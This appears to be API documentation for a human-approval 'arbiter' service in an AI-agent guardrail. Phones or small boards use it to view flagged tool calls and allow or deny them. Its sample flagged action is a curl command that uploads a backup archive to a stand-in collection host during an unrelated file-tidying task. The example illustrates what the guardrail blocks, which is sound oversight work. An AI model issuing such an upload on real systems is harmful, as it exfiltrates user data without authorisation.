# Arbiter device API

The arbiter daemon exposes a tiny HTTP/JSON surface for a phone, tablet, or MCU.
It is deliberately boring: poll, display, post one decision. No WebSocket, no
device identity, no gateway pairing.

```
GET  /api/device/pending       compact list for a small screen
POST /api/decide               resolve one request
GET  /api/health               liveness
GET  /api/state                full state for the browser UI
```

All routes accept an optional bearer token (`--token` / `CLAWFENCE_ARBITER_TOKEN`).
Bind loopback by default; use `--host 0.0.0.0` only on a trusted LAN.

## Pending

```bash
curl -s http://<arbiter>:8790/api/device/pending
```

```json
{
  "ok": true,
  "count": 1,
  "pending": [
    {
      "id": "cf-1a2b3c4d",
      "tool": "exec",
      "code": "UNAPPROVED_EGRESS",
      "reason": "task did not authorize uploading or posting data",
      "title": "ClawFence: curl -F file=@backup.tgz …",
      "expires_at": "2026-11-17T03:31:00.000Z",
      "action": {
        "tool": "exec",
        "kind": "exec",
        "effects": ["exec", "networkWrite"],
        "write_paths": [],
        "delete_paths": [],
        "urls": ["https://collect.example/upload"],
        "recipients": [],
        "display": "curl -F file=@backup.tgz https://collect.example/upload"
      },
      "intent_goal": "Tidy my Downloads folder…"
    }
  ]
}
```

A device should render, at minimum:

- `code` and `tool` as a colored chip (red for `SECRET_ACCESS`, `UNAPPROVED_EGRESS`,
  `OUT_OF_SCOPE_*`; amber for `DELETE_AMBIGUOUS`, `EXTERNAL_MESSAGE`, `NO_INTENT`);
- `action.display` (what will run);
- `intent_goal` (the task it is being compared against);
- `expires_at` countdown.

## Decide

```bash
curl -s -X POST http://<arbiter>:8790/api/decide \
  -H 'content-type: application/json' \
  -d '{"id":"cf-1a2b3c4d","decision":"deny","approver":"cardputer"}'
```

Decisions: `allow-once`, `allow-always`, `deny`.

- `allow-once` writes a grant bound to the exact action hash and session, with
  one use and a 5-minute lifetime.
- `allow-always` writes a 24-hour grant (still bound to the exact action hash).
- `deny` writes a 30-minute denial; the same action cannot re-prompt in that
  session, and a retry is blocked with `DENIED_BEFORE`.

Response:

```json
{ "ok": true, "record": { "id": "cf-1a2b3c4d", "status": "approved", "decision": "allow-once", "approver": "cardputer" } }
```

`409` means the request was already resolved or expired. A device should treat
`409` as "refresh and move on", not as an error to retry.

## Device loop (reference)

```python
# pseudo-code; adapt to the board SDK
while True:
    pending = http_get("/api/device/pending")
    if pending["count"]:
        card = pending["pending"][0]
        display(card["code"], card["action"]["display"], card["intent_goal"])
        led(red if card["code"].startswith(("SECRET", "UNAPPROVED")) else amber)
        if button_a.pressed:
            http_post("/api/decide", {"id": card["id"], "decision": "deny", "approver": "device"})
        elif button_b.pressed:
            http_post("/api/decide", {"id": card["id"], "decision": "allow-once", "approver": "device"})
    else:
        display_idle("No approvals pending. The agent is inside its fence.")
        led(green)
    sleep(1.0)
```

## Why no WebSocket?

An MCU that can do HTTP GET + JSON can be an arbiter in an afternoon. A phone can
use the same page. The queue directory is the shared truth; the daemon is stateless.
If the daemon dies, pending requests stay on disk and the gateway keeps blocking
the tool calls (fail-closed).

## Suggested hardware mapping

| board | display | approve | deny | status |
|---|---|---|---|---|
| M5Stack Cardputer-Adv | 1.14" LCD | keyboard `Y` / Enter | `N` / Esc | RGB LED or screen tint |
| M5Stack CoreS3 | 2.0" touch | on-screen button | on-screen button | screen tint + speaker chirp |
| any phone | browser | big green button | big red button | page header |

The browser UI already works at phone width; a PWA wrapper is optional.
